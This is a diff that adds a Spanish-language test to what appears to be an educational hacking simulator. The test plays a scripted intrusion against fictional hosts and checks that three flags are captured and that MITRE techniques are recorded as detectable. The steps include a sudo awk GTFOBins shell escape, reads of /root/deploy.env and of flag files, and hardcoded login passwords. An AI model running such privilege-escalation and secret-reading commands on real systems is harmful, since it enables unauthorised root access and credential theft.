@@ -324,4 +324,25 @@ describe("Mapa de red (subnets + netmap)", () => {
     expect(kc.indexOf("Descubrimiento")).toBeLessThan(kc.indexOf("Movimiento lateral"));
     expect(kc.indexOf("Movimiento lateral")).toBeLessThan(kc.indexOf("Recolección"));
   });
+
+  it("capstone Yvytu Cloud: la cadena completa captura las 3 banderas y es DETECTABLE", () => {
+    for (const step of [
+      "connect deploy.yvytu.nande ci Deploy2024",
+      "cat /home/ci/user.txt",
+      "sudo awk 'BEGIN{system(\"/bin/sh\")}'",
+      "cat /root/flag.txt",
+      "cat /root/deploy.env",
+      "connect artefactos.yvytu.nande deployer Art3f@cts!2024",
+      "cat /root/flag.txt",
+    ]) term.execute(step);
+    const flags = kernel.player.capturedFlags();
+    expect(flags).toContain("ND{yvytu_foothold}");
+    expect(flags).toContain("ND{yvytu_root}");
+    expect(flags).toContain("ND{yvytu_exfil}");
+    // Cada paso encendió su técnica: privesc, lateral y recolección se ven en el SOC.
+    const ids = kernel.mitre.techniques().map((t) => t.mitreId);
+    expect(ids).toContain("T1548.003"); // privesc sudo/GTFOBins (awk)
+    expect(ids).toContain("T1021");     // movimiento lateral (pivote al repo)
+    expect(ids).toContain("T1005");     // recolección del botín
+  });
 });
